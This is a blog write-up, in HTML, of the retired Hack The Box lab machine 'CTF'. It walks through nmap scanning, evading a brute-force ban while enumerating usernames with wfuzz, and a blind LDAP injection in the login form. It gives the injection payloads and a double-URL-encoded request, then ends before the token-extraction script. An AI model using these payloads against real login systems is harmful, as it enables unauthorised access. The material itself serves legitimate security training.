<!DOCTYPE html>
<html lang="en"><head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.5.0 -->
<title>Hack The Box - CTF | 0xRick Owned Root !</title>
<meta name="generator" content="Jekyll v3.7.4" />
<meta property="og:title" content="Hack The Box - CTF" />
<meta property="og:locale" content="en_US" />
<meta name="description" content="Quick Summary Hey guys today CTF retired and here’s my write-up about it. CTF was a very cool box, it had an ldap injection vulnerability which I have never seen on another box before, and the way of exploiting that vulnerability to gain access was great. A really unique box, I had fun solving it and I hope you have fun too reading my write-up. It’s a Linux box and its ip is 10.10.10.122, I added it to /etc/hosts as ctf.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC ctf.htb Only http on port 80 and ssh on port 22 HTTP Initial Enumeration http://ctf.htb It’s pretty straightforward that we will get banned for 5 minutes if we tried to bruteforce anything, like sub directories for example. It’s also saying that they handle authentication with tokens, There’s a login page so let’s take a look at it. We need a username and an OTP (one-time password). An OTP is time limited which means that even if we could get a valid one it will give us access only once because it expires in a short time (usually 60 seconds). So we need to gain access to a place that generates valid OTPs or to be able to generate valid OTPs ourselves. Let’s take a look at the source code of the login page, maybe something is there : ``` &lt;!doctype html&gt;" />
<meta property="og:description" content="Quick Summary Hey guys today CTF retired and here’s my write-up about it. CTF was a very cool box, it had an ldap injection vulnerability which I have never seen on another box before, and the way of exploiting that vulnerability to gain access was great. A really unique box, I had fun solving it and I hope you have fun too reading my write-up. It’s a Linux box and its ip is 10.10.10.122, I added it to /etc/hosts as ctf.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC ctf.htb Only http on port 80 and ssh on port 22 HTTP Initial Enumeration http://ctf.htb It’s pretty straightforward that we will get banned for 5 minutes if we tried to bruteforce anything, like sub directories for example. It’s also saying that they handle authentication with tokens, There’s a login page so let’s take a look at it. We need a username and an OTP (one-time password). An OTP is time limited which means that even if we could get a valid one it will give us access only once because it expires in a short time (usually 60 seconds). So we need to gain access to a place that generates valid OTPs or to be able to generate valid OTPs ourselves. Let’s take a look at the source code of the login page, maybe something is there : ``` &lt;!doctype html&gt;" />
<link rel="canonical" href="http://localhost:4000/hack-the-box/ctf/" />
<meta property="og:url" content="http://localhost:4000/hack-the-box/ctf/" />
<meta property="og:site_name" content="0xRick Owned Root !" />
<meta property="og:image" content="http://localhost:4000/hackthebox/ctf/0.png" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2019-07-20T00:00:00+02:00" />
<script type="application/ld+json">
{"description":"Quick Summary Hey guys today CTF retired and here’s my write-up about it. CTF was a very cool box, it had an ldap injection vulnerability which I have never seen on another box before, and the way of exploiting that vulnerability to gain access was great. A really unique box, I had fun solving it and I hope you have fun too reading my write-up. It’s a Linux box and its ip is 10.10.10.122, I added it to /etc/hosts as ctf.htb. Let’s jump right in ! Nmap As always we will start with nmap to scan for open ports and services : nmap -sV -sT -sC ctf.htb Only http on port 80 and ssh on port 22 HTTP Initial Enumeration http://ctf.htb It’s pretty straightforward that we will get banned for 5 minutes if we tried to bruteforce anything, like sub directories for example. It’s also saying that they handle authentication with tokens, There’s a login page so let’s take a look at it. We need a username and an OTP (one-time password). An OTP is time limited which means that even if we could get a valid one it will give us access only once because it expires in a short time (usually 60 seconds). So we need to gain access to a place that generates valid OTPs or to be able to generate valid OTPs ourselves. Let’s take a look at the source code of the login page, maybe something is there : ``` &lt;!doctype html&gt;","@type":"BlogPosting","url":"http://localhost:4000/hack-the-box/ctf/","image":"http://localhost:4000/hackthebox/ctf/0.png","headline":"Hack The Box - CTF","dateModified":"2019-07-20T00:00:00+02:00","datePublished":"2019-07-20T00:00:00+02:00","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/hack-the-box/ctf/"},"@context":"http://schema.org"}</script>
<!-- End Jekyll SEO tag -->
<link rel="stylesheet" href="/assets/css/tagbuttons.css">
  <link rel="stylesheet" href="/assets/css/ad.css">
  <link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="0xRick Owned Root !" /></head>
<!-- Global site tag (gtag.js) - Google Analytics -->
<script async src="https://www.googletagmanager.com/gtag/js?id=UA-97164925-2"></script>
<script>
  window.dataLayer = window.dataLayer || [];
  function gtag(){dataLayer.push(arguments);}
  gtag('js', new Date());

  gtag('config', 'UA-97164925-2');
</script>

<body><header class="site-header" role="banner">

  <div class="wrapper"><a class="site-title" rel="author" href="/">0xRick Owned Root !</a><nav class="site-nav">
        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
        <label for="nav-trigger">
          <span class="menu-icon">
            <svg viewBox="0 0 18 15" width="18px" height="15px">
              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
            </svg>
          </span>
        </label>

        <div class="trigger"><a class="page-link" href="/about/">About</a><a class="page-link" href="/categories/">Categories</a><a class="page-link" href="/tags/">Tags</a></div>
      </nav></div>
</header>
<main class="page-content" aria-label="Content">
      <div class="wrapper">
        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">

  <header class="post-header">
    <h1 class="post-title p-name" itemprop="name headline">Hack The Box - CTF</h1>
    <p class="post-meta">
      <h7>
        Tags: 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Linux/';">Linux</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Web/';">Web</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/RCE/';">RCE</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/php/';">php</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/ssh/';">ssh</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Python/';">Python</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/Exploit Development/';">Exploit Development</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/ldap/';">ldap</button> 
        
        <button class="tagbutton" onclick="window.location.href = '/tags/code analysis/';">code analysis</button> 
        
      </h7>
      <br>
      <time class="dt-published" datetime="2019-07-20T00:00:00+02:00" itemprop="datePublished">Jul 20, 2019
      </time><script async type="text/javascript" src="//cdn.carbonads.com/carbon.js?serve=CK7DL23U&placement=0xrickgithubio" id="_carbonads_js"></script>
</p>
  </header>

  <div class="post-content e-content" itemprop="articleBody">
    <hr />

<h3 id="quick-summary">Quick Summary</h3>
<h4 id="hey-guys-today-ctf-retired-and-heres-my-write-up-about-it-ctf-was-a-very-cool-box-it-had-an-ldap-injection-vulnerability-which-i-have-never-seen-on-another-box-before-and-the-way-of-exploiting-that-vulnerability-to-gain-access-was-great-a-really-unique-box-i-had-fun-solving-it-and-i-hope-you-have-fun-too-reading-my-write-up-its-a-linux-box-and-its-ip-is-101010122-i-added-it-to-etchosts-as-ctfhtb-lets-jump-right-in-">Hey guys today CTF retired and here’s my write-up about it. CTF was a very cool box, it had an <code class="highlighter-rouge">ldap</code> injection vulnerability which I have never seen on another box before, and the way of exploiting that vulnerability to gain access was great. A really unique box, I had fun solving it and I hope you have fun too reading my write-up. It’s a Linux box and its ip is <code class="highlighter-rouge">10.10.10.122</code>, I added it to <code class="highlighter-rouge">/etc/hosts</code> as <code class="highlighter-rouge">ctf.htb</code>. Let’s jump right in !</h4>
<p><img src="/images/hackthebox/ctf/0.png" alt="" /></p>
<hr />

<h3 id="nmap">Nmap</h3>
<h4 id="as-always-we-will-start-with-nmap-to-scan-for-open-ports-and-services-">As always we will start with <code class="highlighter-rouge">nmap</code> to scan for open ports and services :</h4>
<p><code class="highlighter-rouge">nmap -sV -sT -sC ctf.htb</code>
<img src="/images/hackthebox/ctf/1.png" alt="" /></p>
<h4 id="only-http-on-port-80-and-ssh-on-port-22">Only <code class="highlighter-rouge">http</code> on port 80 and <code class="highlighter-rouge">ssh</code> on port 22</h4>
<p><br /></p>
<hr />

<h3 id="http-initial-enumeration">HTTP Initial Enumeration</h3>
<p><code class="highlighter-rouge">http://ctf.htb</code>
<img src="/images/hackthebox/ctf/2.png" alt="" /></p>
<h4 id="its-pretty-straightforward-that-we-will-get-banned-for-5-minutes-if-we-tried-to-bruteforce-anything-like-sub-directories-for-example-its-also-saying-that-they-handle-authentication-with-tokens-theres-a-login-page-so-lets-take-a-look-at-it">It’s pretty straightforward that we will get banned for 5 minutes if we tried to bruteforce anything, like sub directories for example. It’s also saying that they handle authentication with tokens, There’s a login page so let’s take a look at it.</h4>
<p><img src="/images/hackthebox/ctf/3.png" alt="" /></p>
<h4 id="we-need-a-username-and-an-otp-one-time-password-an-otp-is-time-limited-which-means-that-even-if-we-could-get-a-valid-one-it-will-give-us-access-only-once-because-it-expires-in-a-short-time-usually-60-seconds-so-we-need-to-gain-access-to-a-place-that-generates-valid-otps-or-to-be-able-to-generate-valid-otps-ourselves-lets-take-a-look-at-the-source-code-of-the-login-page-maybe-something-is-there-">We need a username and an <code class="highlighter-rouge">OTP</code> (one-time password). An <code class="highlighter-rouge">OTP</code> is time limited which means that even if we could get a valid one it will give us access only once because it expires in a short time (usually 60 seconds). So we need to gain access to a place that generates valid <code class="highlighter-rouge">OTP</code>s or to be able to generate valid <code class="highlighter-rouge">OTP</code>s ourselves. Let’s take a look at the source code of the login page, maybe something is there :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;head&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">charset=</span><span class="s">"utf-8"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"viewport"</span> <span class="na">content=</span><span class="s">"width=device-width, initial-scale=1, shrink-to-fit=no"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"description"</span> <span class="na">content=</span><span class="s">""</span><span class="nt">&gt;</span>
    <span class="nt">&lt;meta</span> <span class="na">name=</span><span class="s">"author"</span> <span class="na">content=</span><span class="s">""</span><span class="nt">&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">rel=</span><span class="s">"icon"</span> <span class="na">href=</span><span class="s">"/favicon.ico"</span><span class="nt">&gt;</span>

    <span class="nt">&lt;title&gt;</span>CTF login form<span class="nt">&lt;/title&gt;</span>

    <span class="c">&lt;!-- Bootstrap core CSS --&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"/dist/css/bootstrap.min.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>

    <span class="c">&lt;!-- Custom styles for this template --&gt;</span>
    <span class="nt">&lt;link</span> <span class="na">href=</span><span class="s">"cover.css"</span> <span class="na">rel=</span><span class="s">"stylesheet"</span><span class="nt">&gt;</span>
  <span class="nt">&lt;/head&gt;</span>

  <span class="nt">&lt;body</span> <span class="na">class=</span><span class="s">""</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"cover-container d-flex w-100 h-100 p-3 mx-auto flex-column"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;header</span> <span class="na">class=</span><span class="s">"masthead mb-auto"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"inner"</span><span class="nt">&gt;</span>
          <span class="nt">&lt;h3</span> <span class="na">class=</span><span class="s">"masthead-brand"</span><span class="nt">&gt;</span>CTF<span class="nt">&lt;/h3&gt;</span>
          <span class="nt">&lt;nav</span> <span class="na">class=</span><span class="s">"nav nav-masthead justify-content-center"</span><span class="nt">&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"nav-link active"</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>Home<span class="nt">&lt;/a&gt;</span>
            <span class="nt">&lt;a</span> <span class="na">class=</span><span class="s">"nav-link active"</span> <span class="na">href=</span><span class="s">"login.php"</span><span class="nt">&gt;</span>Login<span class="nt">&lt;/a&gt;</span>
          <span class="nt">&lt;/nav&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
      <span class="nt">&lt;/header&gt;</span>

<span class="nt">&lt;form</span> <span class="na">action=</span><span class="s">"/login.php"</span> <span class="na">method=</span><span class="s">"post"</span> <span class="nt">&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group row"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group row"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"inputUsername"</span> <span class="na">class=</span><span class="s">"col-sm-2 col-form-label"</span><span class="nt">&gt;</span>Username<span class="nt">&lt;/label&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"text"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"inputUsename"</span> <span class="na">name=</span><span class="s">"inputUsername"</span> <span class="na">placeholder=</span><span class="s">"Username"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group row"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;label</span> <span class="na">for=</span><span class="s">"inputOTP"</span> <span class="na">class=</span><span class="s">"col-sm-2 col-form-label"</span><span class="nt">&gt;</span>OTP<span class="nt">&lt;/label&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;input</span> <span class="na">type=</span><span class="s">"OTP"</span> <span class="na">class=</span><span class="s">"form-control"</span> <span class="na">id=</span><span class="s">"inputOTP"</span> <span class="na">name=</span><span class="s">"inputOTP"</span> <span class="na">placeholder=</span><span class="s">"One Time Password"</span><span class="nt">&gt;</span>
      <span class="c">&lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) --&gt;</span>
      <span class="c">&lt;!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) --&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"form-group row"</span><span class="nt">&gt;</span>
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
      <span class="nt">&lt;button</span> <span class="na">type=</span><span class="s">"submit"</span> <span class="na">class=</span><span class="s">"btn btn-primary  name="</span><span class="na">submit</span><span class="err">"</span> <span class="na">value=</span><span class="s">"Login"</span><span class="nt">&gt;</span>Login<span class="nt">&lt;/button&gt;</span>
    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
<span class="nt">&lt;/form&gt;</span>      
      <span class="nt">&lt;footer</span> <span class="na">class=</span><span class="s">"mastfoot mt-auto text-center"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"inner"</span><span class="nt">&gt;</span>
        <span class="nt">&lt;p&gt;&lt;a</span> <span class="na">href=</span><span class="s">"/"</span><span class="nt">&gt;</span>CTF<span class="nt">&lt;/a&gt;</span> by <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://www.hackthebox.eu/home/users/profile/13340"</span> <span class="na">target=</span><span class="s">"_blank"</span><span class="nt">&gt;</span>0xEA31<span class="nt">&lt;/a&gt;</span>. Cover template for <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://getbootstrap.com/"</span><span class="nt">&gt;</span>Bootstrap<span class="nt">&lt;/a&gt;</span>, by <span class="nt">&lt;a</span> <span class="na">href=</span><span class="s">"https://twitter.com/mdo"</span><span class="nt">&gt;</span>@mdo<span class="nt">&lt;/a&gt;</span>.<span class="nt">&lt;/p&gt;&lt;/div&gt;</span>
      <span class="nt">&lt;/footer&gt;</span>
    <span class="nt">&lt;/div&gt;</span>

    <span class="c">&lt;!-- Bootstrap core JavaScript
    ================================================== --&gt;</span>
    <span class="c">&lt;!-- Placed at the end of the document so the pages load faster --&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"https://code.jquery.com/jquery-3.3.1.slim.min.js"</span> <span class="na">integrity=</span><span class="s">"sha384-q8i/X+965DzO0rT7abK41JStQIAqVgRVzpbzo5smXKp4YfRvH+8abtTE1Pi6jizo"</span> <span class="na">crossorigin=</span><span class="s">"anonymous"</span><span class="nt">&gt;&lt;/script&gt;</span>
    <span class="nt">&lt;script </span><span class="na">src=</span><span class="s">"/dist/js/bootstrap.min.js"</span><span class="nt">&gt;&lt;/script&gt;</span>
  <span class="nt">&lt;/body&gt;</span>
<span class="nt">&lt;/html&gt;</span>

</code></pre></div></div>
<h4 id="these-comments-look-interesting-">These comments look interesting :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>&lt;!-- we'll change the schema in the next phase of the project (if and only if we will pass the VA/PT) --&gt;
      &lt;!-- at the moment we have choosen an already existing attribute in order to store the token string (81 digits) --&gt;
</code></pre></div></div>
<h4 id="so-now-we-know-that-they-are-using-a-token-to-generate-the-otps-we-also-know-that-the-length-of-the-token-is-81-digits-but-i-still-couldnt-figure-out-that-part-about-the-attribute-theyre-using-to-store-the-token-i-decided-to-bruteforce-the-username-then-return-to-the-otp-thing-again">So now we know that they are using a token to generate the <code class="highlighter-rouge">OTP</code>s, we also know that the length of the token is 81 digits. But I still couldn’t figure out that part about the attribute they’re using to store the token. I decided to bruteforce the username then return to the <code class="highlighter-rouge">OTP</code> thing again.</h4>
<h4 id="i-know-what-youre-thinking-how-will-i-bruteforce-the-username-without-getting-banned--well-i-tried-to-pass-any-credentials-to-see-how-will-the-application-respond-">I know what you’re thinking, how will I bruteforce the username without getting banned ? Well I tried to pass any credentials to see how will the application respond :</h4>
<p><img src="/images/hackthebox/ctf/4.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/ctf/5.png" alt="" /></p>
<h4 id="here-i-noticed-2-things-first-thing-is-that-its-actually-telling-us-if-the-user-exists-or-not-which-means-that-we-can-enumerate-users-the-other-thing-is-that-it-responded-normally-with-a-200-ok-response-so-if-the-server-identifies-a-bruteforce-attack-by-monitoring-how-many-times-an-ip-causes-errors-like-404-for-example-as-long-as-we-are-not-causing-errors-we-wont-get-banned-i-gave-it-a-try-to-see-if-it-will-actually-work-i-used-wfuzz-and-multiplesources-users-fabian-fingerledetxt-from-seclists-">Here I noticed 2 things. First thing is that it’s actually telling us if the user exists or not, which means that we can enumerate users. The other thing is that it responded normally with a <code class="highlighter-rouge">200 OK</code> response, so If the server identifies a bruteforce attack by monitoring how many times an ip causes errors like <code class="highlighter-rouge">404</code> for example, as long as we are not causing errors we won’t get banned. I gave it a try to see if it will actually work. I used <code class="highlighter-rouge">wfuzz</code> and <a href="https://github.com/danielmiessler/SecLists/blob/master/Usernames/Honeypot-Captures/multiplesources-users-fabian-fingerle.de.txt"><code class="highlighter-rouge">multiplesources-users-fabian-fingerle.de.txt</code></a> from <a href="https://github.com/danielmiessler/SecLists">seclists</a> :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ctf# wfuzz -c -u http://ctf.htb/login.php -X POST -d "inputUsername=FUZZ&amp;inputOTP=0000" -w ./multiplesources-users-fabian-fingerle.de.txt 

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://ctf.htb/login.php
Total requests: 21168

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000007:  C=200     68 L      229 W         2810 Ch        "!@#%^&amp;*("
000008:  C=200     68 L      229 W         2810 Ch        "!@#%^&amp;*()"
000010:  C=200     68 L      229 W         2810 Ch        "*****"
000002:  C=200     68 L      229 W         2810 Ch        "!@#"
000003:  C=200     68 L      229 W         2810 Ch        "!@#%"
000004:  C=200     68 L      229 W         2810 Ch        "!@#%^"
000005:  C=200     68 L      229 W         2810 Ch        "!@#%^&amp;"
000009:  C=200     68 L      233 W         2827 Ch        """"
000006:  C=200     68 L      229 W         2810 Ch        "!@#%^&amp;*"
000001:  C=200     68 L      233 W         2826 Ch        "-"
000011:  C=200     68 L      233 W         2826 Ch        "0"
000012:  C=200     68 L      233 W         2827 Ch        "00"
000021:  C=200     68 L      233 W         2835 Ch        "0123456789"
000015:  C=200     68 L      233 W         2833 Ch        "00000000"
000016:  C=200     68 L      233 W         2827 Ch        "01"
^C
Finishing pending requests...
</code></pre></div></div>
<h4 id="all-user-not-found-responses-have-233-words-so-i-filtered-them-">All “user not found” responses have 233 words so I filtered them :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>root@kali:~/Desktop/HTB/boxes/ctf# wfuzz -c --hw 233 -u http://ctf.htb/login.php -X POST -d "inputUsername=FUZZ&amp;inputOTP=0000" -w ./multiplesources-users-fabian-fingerle.de.txt                                  

Warning: Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.

********************************************************
* Wfuzz 2.3.4 - The Web Fuzzer                         *
********************************************************

Target: http://ctf.htb/login.php
Total requests: 21168

==================================================================
ID   Response   Lines      Word         Chars          Payload    
==================================================================

000006:  C=200     68 L      229 W         2810 Ch        "!@#%^&amp;*"
000003:  C=200     68 L      229 W         2810 Ch        "!@#%"
000004:  C=200     68 L      229 W         2810 Ch        "!@#%^"
000005:  C=200     68 L      229 W         2810 Ch        "!@#%^&amp;"
000007:  C=200     68 L      229 W         2810 Ch        "!@#%^&amp;*("
000008:  C=200     68 L      229 W         2810 Ch        "!@#%^&amp;*()"
000002:  C=200     68 L      229 W         2810 Ch        "!@#"
000010:  C=200     68 L      229 W         2810 Ch        "*****"
000065:  C=200     68 L      229 W         2810 Ch        "123456*a"
005121:  C=200     68 L      229 W         2810 Ch        "Ch4ng3m3!"
005723:  C=200     68 L      229 W         2810 Ch        "*%Cookie:"
009377:  C=200     68 L      229 W         2810 Ch        "!!Huawei"
011497:  C=200     68 L      231 W         2822 Ch        "ldapuser"
011866:  C=200     68 L      234 W         2835 Ch        "lost+found"
012611:  C=200     68 L      233 W         2831 Ch        "maurta"^C
Finishing pending requests...
</code></pre></div></div>
<h4 id="it-worked-and-i-didnt-get-banned-after-some-time-i-got-a-result-which-was-ldapuser-thats-weird-i-also-noticed-that-payloads-that-had-special-characters-in-them-caused-different-response-length-i-tried-ldapuser-to-see-whats-the-other-message-">It worked and I didn’t get banned, after some time I got a result which was <code class="highlighter-rouge">ldapuser</code>, that’s weird. I also noticed that payloads that had special characters in them caused different response length. I tried <code class="highlighter-rouge">ldapuser</code> to see what’s the other message :</h4>
<p><img src="/images/hackthebox/ctf/6.png" alt="" />
<br />
<br />
<img src="/images/hackthebox/ctf/7.png" alt="" /></p>
<h4 id="it-was-cannot-login">It was “Cannot login”</h4>
<h4 id="then-i-tried--and-i-got-nothing-i-just-got-the-login-page-back-again-without-any-messages-i-figured-out-that-the-username-is-being-used-in-an-ldap-query-and-its-injectable-because-of-the-special-chars-payloads-also-that-existing-attribute-where-the-token-is-stored-is-an-ldap-attribute-with-the-injection-we-have-we-can-extract-the-token-and-use-it-to-generate-valid-otps-but-because-the-injection-is-blind-it-will-be-kinda-tricky-to-extract-the-token">Then I tried <code class="highlighter-rouge">!@#%^&amp;*</code> and I got nothing, I just got the login page back again without any messages. I figured out that the username is being used in an <code class="highlighter-rouge">ldap</code> query, and it’s injectable (because of the special chars payloads). Also that existing attribute where the token is stored is an <code class="highlighter-rouge">ldap</code> attribute. With the injection we have we can extract the token and use it to generate valid <code class="highlighter-rouge">OTP</code>s. But because the injection is blind it will be kinda tricky to extract the token.</h4>
<p><br /></p>
<hr />

<h3 id="ldap-injection">LDAP Injection</h3>
<h4 id="as-i-said-its-a-blind-injection-which-means-that-we-wont-get-any-results-but-a-payload-like-this-uiduid--should-result-in-cannot-login-however-when-i-tried-it-i-didnt-get-any-message-so-i-tried-to-url-encode-the-payload-and-it-worked-so-the-injection-works-when-the-payload-is-double-url-encoded-i-only-encoded-the-payload-once-because-the-browser-automatically-encodes-post-data-i-switched-to-burp-here-are-the-results-">As I said, it’s a blind injection which means that we won’t get any results. But a payload like this :<code class="highlighter-rouge">*)(uid=*))(|(uid=*</code>  should result in “Cannot login”. However when I tried it I didn’t get any message, So I tried to URL encode the payload and it worked. So the injection works when the payload is double URL encoded (I only encoded the payload once because the browser automatically encodes POST data). I switched to burp, here are the results :</h4>
<h4 id="request-">Request :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>POST /login.php HTTP/1.1
Host: ctf.htb
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://ctf.htb/login.php
Content-Type: application/x-www-form-urlencoded
Content-Length: 190
Cookie: PHPSESSID=sqmpanb3d1uui0pf4uafubv010
Connection: close
Upgrade-Insecure-Requests: 1

inputUsername=%25%32%61%25%32%39%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61%25%32%39%25%32%39%25%32%38%25%37%63%25%32%38%25%37%35%25%36%39%25%36%34%25%33%64%25%32%61&amp;inputOTP=0000
</code></pre></div></div>
<h4 id="response-">Response :</h4>
<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>
HTTP/1.1 200 OK
Date: Fri, 19 Jul 2019 17:58:29 GMT
Server: Apache/2.4.6 (CentOS) OpenSSL/1.0.2k-fips mod_fcgid/2.3.9 PHP/5.4.16
X-Powered-By: PHP/5.4.16
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0
Pragma: no-cache
Content-Length: 2822
Connection: close
Content-Type: text/html; charset=UTF-8

<span class="cp">&lt;!doctype html&gt;</span>
<span class="nt">&lt;html</span> <span class="na">lang=</span><span class="s">"en"</span><span class="nt">&gt;</span>
	---------
	 Removed
	---------
    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">"col-sm-10"</span><span class="nt">&gt;</span>
    Cannot login    <span class="nt">&lt;/div&gt;</span>
  <span class="nt">&lt;/div&gt;</span>
	---------
	 Removed
	---------
</code></pre></div></div>
<h4 id="now-we-need-to-know-which-attribute-the-token-is-stored-in-we-know-its-an-existing-attribute-so-we-just-need-to-choose-the-right-one-i-checked-ldap-attributes-and-chose-some-of-them-to-test-comment-pager-and-info-the-payload-will-be-like-this--uidattribute-instead-of-the-second-uid-attribute-we-will-use-the-attribute-we-are-testing-we-also-know-that-the-token-is-numeric-so-we-can-remove--and-replace-it-with-numeric-values-from-0-to-9-and-monitor-the-responses-i-used-burp-intruder-to-do-this-so-the-final-payload-will-be-like-this--uidattributen-after-some-testing-this-payload-with-the-attribute-pager-and-value-of-2--uidpager2-resulted-in-cannot-login-message-great-so-our-payload-will-be-uidpager2n-and-we-will-bruteforce-the-second-number-again-until-we-get-cannot-login-we-will-keep-repeating-this-until-we-reach-the-81st-number-but-doing-this-manually-is-lame-and-boring-so-i-wrote-a-python-script">Now we need to know which attribute the token is stored in. We know it’s an existing attribute so we just need to choose the right one. I checked <a href="https://docs.bmc.com/docs/fpsc121/ldap-attributes-and-associated-fields-495323340.html"><code class="highlighter-rouge">ldap</code> attributes</a> and chose some of them to test (<code class="highlighter-rouge">comment</code>, <code class="highlighter-rouge">pager</code> and <code class="highlighter-rouge">info</code>), the payload will be like this : <code class="highlighter-rouge">*)(uid=*))(|(ATTRIBUTE=*</code> (instead of the second <code class="highlighter-rouge">uid</code> attribute we will use the attribute we are testing). We also know that the token is numeric so we can remove <code class="highlighter-rouge">*</code> and replace it with numeric values from 0 to 9 and monitor the responses (I used burp intruder to do this). So the final payload will be like this : <code class="highlighter-rouge">*)(uid=*))(|(ATTRIBUTE=N</code>. After some testing this payload with the attribute <code class="highlighter-rouge">pager</code> and value of 2 : <code class="highlighter-rouge">*)(uid=*))(|(pager=2</code> resulted in “Cannot login” message. Great so our payload will be <code class="highlighter-rouge">*)(uid=*))(|(pager=2N</code> and we will bruteforce the second number again until we get “Cannot login”. We will keep repeating this until we reach the 81st number, but doing this manually is lame and boring so I wrote a python script.</h4>
<p><br /></p>
<hr />

<h3 id="exploitation-token-extraction">Exploitation, Token Extraction</h3>
<h4 id="i-created-3-functions-">I created 3 functions :</h4>
<ul>
  <li>
